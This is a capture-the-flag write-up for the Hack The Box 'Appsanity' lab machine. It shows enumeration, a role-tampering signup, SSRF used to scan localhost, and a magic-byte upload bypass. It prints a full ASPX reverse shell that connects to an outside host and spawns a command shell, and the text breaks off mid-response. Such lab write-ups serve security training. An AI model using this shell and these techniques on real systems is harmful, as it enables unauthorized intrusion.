---
title:  "HTB Appsanity Writeup"
date:   2024-03-09 00:30:00 
categories: HTB Machine
tags: Vhost_enumaration DLL_hijacking SSRF Insecure_File_Upload
---



![Appsanity box card](/assets/img/Appsanity/F9YKdo6XUAABBwM.png)

## Introduction

Appsanity was as the name suggest a box that focussed heavily on abusing application. Initial access, lateral movement and privilege escalation were all related to abusing an application in one way or the other. Hope you like the write up.


If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.


## Initial access
### Recon

To start our recon off we will start with an Nmap scan of all the TCP ports. using the following command
```
sudo nmap -sS -A  -o nmap  meddigi.htb
```

**Nmap**
```
# Nmap 7.94 scan initiated Mon Oct 30 11:04:36 2023 as: nmap -sS -A -o nmap meddigi.htb
Nmap scan report for meddigi.htb (10.10.11.238)
Host is up (0.036s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
80/tcp  open  http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp open  ssl/https
| ssl-cert: Subject: commonName=meddigi.htb
| Subject Alternative Name: DNS:meddigi.htb
| Not valid before: 2023-09-16T16:03:00
|_Not valid after:  2024-09-16T16:23:00
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: MedDigi
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   41.27 ms 10.10.14.1
2   41.79 ms meddigi.htb (10.10.11.238)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 30 11:05:05 2023 -- 1 IP address (1 host up) scanned in 29.52 seconds
```

Based on the output of nmap I could only see that web services were open. This then became the first place to start looking. The main web application did not have anything really interesting. You were able to log in and send some messages but none of these features looked that interesting at the time being. Then i started looking for any vhosts using wfuzz. here i found a new portal.

```
sudo wfuzz -c -f sub-fighter -Z -w ./subdomains-top1million-5000.txt  -u http://meddigi.htb -H "Host: FUZZ.meddigi.htb" 
```

![Subdomain brute force ](/assets/img/Appsanity/Appsanity_1.png)

![Portal](/assets/img/Appsanity/Appsanity_02.png)

So i wasn't able to get access to this portal it was meant for doctors and currently i did not have any Doctor credentials or tokens. So i went back to the main page looking deeper into the main application. Here i noticed something odd in the **/Signin/Singup** request. It had a parameter called Acctype=1. I then tried to make an account using Acctype=2 and this actually let me create an account for a doctor.

```
POST /Signup/SignUp HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8CZ4TCeDqC5Lil1Np6zKED-HF2ebVj5pdvYfzY4Kf3I4G-_U5rGbrlNRH06xd9FOlGjW_Nto_kq8QfvkYUT-ziYrdSE-HnarygrwbT31_c5E5BWorCzj7G9BYn5MMowRKq8UnXqTqHJYbn1cNmXHn_Y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 367
Origin: https://meddigi.htb
Referer: https://meddigi.htb/signup
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

Name=test&LastName=test&Email=Calico%40nomail&Password=%5E3cJ%3Exv2%2BZBGB%21U&ConfirmPassword=%5E3cJ%3Exv2%2BZBGB%21U&DateOfBirth=1990-03-10&PhoneNumber=0000000000&Country=s&Acctype=2&__RequestVerificationToken=CfDJ8CZ4TCeDqC5Lil1Np6zKED8xea0VUpO39eARB-BUUZEzyF4_HzXbfch-_FYdbehPFtpCfqFOk5s1vqJhSW-adq2GqsGzKmTM4hTmTJteuHWA-VFQvp0kcW8yi5sJfH4p7jaSk99GWi8_77Bb_pvO_b0
```

The server then issued the following response sending us back to the login page.

```
HTTP/2 302 Found
Location: /Signin
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8GKie7RXH0NNgSjToJo2WHH42_R27PqMiUUgdvCA1KV-ZzOrw-S45RNxK4QpCH589v-FR3ZI-zkAn85oPyqBxEu6FvkmVxy5hWg57Gl8cdHWA8t82gTTOta_Z2QtrE56MNOQEB4rRMgepwzxt1NfP-PmYuO3A7rpCpX1ZV5GXOl6A5n7b8CnHFVDvlQDscTtgw; path=/; samesite=lax; httponly

Date: Mon, 30 Oct 2023 17:34:02 GMT
```
Then after signing in you'd notice you were using a Doctor's account

![Signed in as doctor](/assets/img/Appsanity/Appsanity_03.png)

### Gaining access to portal.meddigi.htb
So now using i tried to use this token by placing it in the request towards the portal and ended up with accessing the profile.

```
GET /Profile HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8GKie7RXH0NNgSjToJo2WHE8gVzMdYAvTpJNOho61nwyyxn6T86a2cHYlYWVZgIqPeiEk4FXxPMvB5gGMAeYw8ThATeu3Q1K9jMy4XU-uo9VzRVOXXj7Oza0kvm6Jxu0uRKPQ9VTQlU_K2Zb-6ktjDU; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEwIiwiZW1haWwiOiJDYWxpY29Abm9tYWlsIiwibmJmIjoxNjk4Njg3MjQ3LCJleHAiOjE2OTg2OTA4NDcsImlhdCI6MTY5ODY4NzI0NywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.ueLk-5Fv9bCf_yhIsuhQ8xaA_9ERE7mMdsT7MjJgxRQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://meddigi.htb/Signin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

![Signed in as doctor in portal](/assets/img/Appsanity/Appsanity_04.png)

After looking around the web application a bit more i noticed it was possible to do requests to any URL. I tested this out by letting it send a request to my webserver
```
POST /Prescriptions/SendEmail HTTP/2
Host: portal.meddigi.htb
Cookie: .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8LlcnPjBNjtEgfDAy5zFqrdVy40oHSuABbhKlqugEHA98KcoeiiOib7pIVCLAVYvs_Kq9PD_ruFJulneiVktL04VQmFgKDTotzk2reBDJ6rTdH_mTCM9lNQTi2ghcG410mx8tEUTh9-KOq9PFSjti-c; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6IkNhbGljbzJAbm9tYWlsIiwibmJmIjoxNjk4ODQ5NTI3LCJleHAiOjE2OTg4NTMxMjcsImlhdCI6MTY5ODg0OTUyNywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.0arv_VDhjBTkB8NfwqbdWtj5s7FHtotoPK5Af4P3ahw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portal.meddigi.htb/Prescriptions
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://portal.meddigi.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

Email=test%40calico.com&Link=http%3A%2F%2F10.10.14.85
```

This resulted in the page rendering our webserver.

![Page Rendering](/assets/img/Appsanity/Appsanity_05.png)

So now we had proof we could send arbitrary web requests. I've tried to include any files this way but they wouldn't work. My next guess was to try and find any services that might be present on local host. To do this i used burp intruder where i enumerated the most common web ports from seclist.

**Intruder Request**
```
POST /Prescriptions/SendEmail HTTP/2
Host: portal.meddigi.htb
Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6IkNhbGljbzJAbm9tYWlsIiwibmJmIjoxNjk4ODQzODkzLCJleHAiOjE2OTg4NDc0OTMsImlhdCI6MTY5ODg0Mzg5MywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.3KyARX66OPDW9iF6UplNiVvYBqAv0oisgdyvn3mL_Gs; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8FhvFerQo_JInhOEs9lpsY2lWkGrej8xzoWjVh2YGQ8ZYJYu5nF22jXfsUaVJRG0lCX3MLW6Wt0275KR49YgG4XrBDlHUsygM-HvPn-BYr5aT6qq4GszFTilwK7nRBDYoDDVcQ5kOyodxf1AV4d5_q8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portal.meddigi.htb/Prescriptions
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://portal.meddigi.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

Email=calico%40nomail.com&Link=http%3A%2F%2F127.0.0.1:§80§
```

After a minute or so we get the following results showing that on localhost **port 8080** was open

![Port 8080 open](/assets/img/Appsanity/Appsanity_06.png)

Next i sent a request to this portal and checked the content. here i could see that it was actually a web page that showed all the files that were uploaded.

![Uploaded files](/assets/img/Appsanity/Appsanity_07.png)


### Payload crafting 
I noticed there was an upload functionality in the upload report page. While trying to bypass the upload filter i noticed that it didn't really care about extensions or any content really other than the magic bytes. i then tried to append my shell to the back of a dummy pdf file [Dummy File](https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf).

Upload this file using the upload report page. then at the end of the file after th EOF marking you place your shell. Don't forget to change your file's extension to aspx
```
POST /ExamReport/Upload HTTP/2
Host: portal.meddigi.htb
Cookie: .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8LlcnPjBNjtEgfDAy5zFqrdVy40oHSuABbhKlqugEHA98KcoeiiOib7pIVCLAVYvs_Kq9PD_ruFJulneiVktL04VQmFgKDTotzk2reBDJ6rTdH_mTCM9lNQTi2ghcG410mx8tEUTh9-KOq9PFSjti-c; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6IkNhbGljbzJAbm9tYWlsIiwibmJmIjoxNjk4ODQ5NTI3LCJleHAiOjE2OTg4NTMxMjcsImlhdCI6MTY5ODg0OTUyNywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.0arv_VDhjBTkB8NfwqbdWtj5s7FHtotoPK5Af4P3ahw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12267539481836323366373413792
Content-Length: 30525
Origin: https://portal.meddigi.htb
Referer: https://portal.meddigi.htb/ExamReport
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="PatientNo"

000000
-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="PatientName"

Calicoss
-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="ExamType"

ssssssss
-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="PhoneNumber"

0000000001
-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="Department"

tt
-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="VisitDate"

0001-01-01
-----------------------------12267539481836323366373413792
Content-Disposition: form-data; name="ReportFile"; filename="Calico1.aspx"
Content-Type: application/pdf

%PDF-1.4
%Ã¤Ã¼Ã¶Ã
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
<SNIPPED FOR BREVITY>
%%EOF
YOUR SHELLCODE HERE 
```
The reverse shell i used i downloaded of github [Shell](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx). I modified the shell with my ip address and port
```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "10.10.14.85"; //CHANGE THIS
            int port = 443; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,									
        uint dwOpenMode,								
        uint dwPipeMode,								
        uint nMaxInstances,							
        uint nOutBufferSize,						
        uint nInBufferSize,							
        uint nDefaultTimeOut,						
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
 
    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101; 
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```

So now our reverse shell has been uploaded next we need to find the exact file location of this file. we can do this by using the SSRF we found earlier. Send the following request

```
POST /Prescriptions/SendEmail HTTP/2
Host: portal.meddigi.htb
Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6IkNhbGljbzJAbm9tYWlsIiwibmJmIjoxNjk4ODQ5NTI3LCJleHAiOjE2OTg4NTMxMjcsImlhdCI6MTY5ODg0OTUyNywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.0arv_VDhjBTkB8NfwqbdWtj5s7FHtotoPK5Af4P3ahw; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8FhvFerQo_JInhOEs9lpsY2lWkGrej8xzoWjVh2YGQ8ZYJYu5nF22jXfsUaVJRG0lCX3MLW6Wt0275KR49YgG4XrBDlHUsygM-HvPn-BYr5aT6qq4GszFTilwK7nRBDYoDDVcQ5kOyodxf1AV4d5_q8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portal.meddigi.htb/Prescriptions
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: https://portal.meddigi.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

Email=calico%40nomail.com&Link=http%3A%2F%2F127.0.0.1:8080
```

Then in the table in this response you will find your file.

```
HTTP/2 200 OK
Content-Length: 7836
Content-Type: text/html
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Date: Wed, 01 Nov 2023 15:07:47 GMT

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Examinations Panel</title>
    <style>
        /* Center the table on the page */
        table {
            margin: 0 auto;
        }
        /* Optional: If you want to set a max width and ensure the table does not stretch full screen */
        body {
            max-width: 1200px;
            margin: 0 auto;
        }

    </style>
</head>
<body>
    <form method="post" action="./" id="ctl00">
